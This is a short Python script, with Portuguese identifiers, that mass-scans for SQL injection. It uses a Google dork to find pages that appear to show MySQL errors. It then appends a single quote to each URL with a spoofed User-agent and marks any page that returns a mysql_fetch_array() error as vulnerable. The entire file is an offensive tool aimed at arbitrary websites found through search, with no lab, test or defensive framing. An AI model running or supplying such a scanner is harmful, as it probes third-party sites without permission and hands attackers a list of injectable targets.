import requests
from google import google


class Error:
    def tipos(self, **erro):
        return erro

    def consulta_google_test_sqli(self, pesquisa, pag):
        search_results = google.search(pesquisa, pag)
        dic_erros = {
            "MYSQL Error1": "mysql_fetch_array()",
            #            "MYSQL Error2": "Warning",
        }
        a = Error().tipos(**dic_erros)
        b = {'User-agent': 'Mozilla/11.0'}
        c = '%27'
        for key in a:
            d = a[key]
            for result in search_results:
                e = result.link
                f = requests.get(e + c, headers=b).text
                if d in f:
                    dif = e
                    print("[ VUL ] >  [ MSG ] ", d, "   =  ", dif)
                else:
                    print("[ ! ] ", d, "  == ", e)


Error().consulta_google_test_sqli(pesquisa='"id=" & intext:"Warning: mysql_fetch_array()', pag=1)
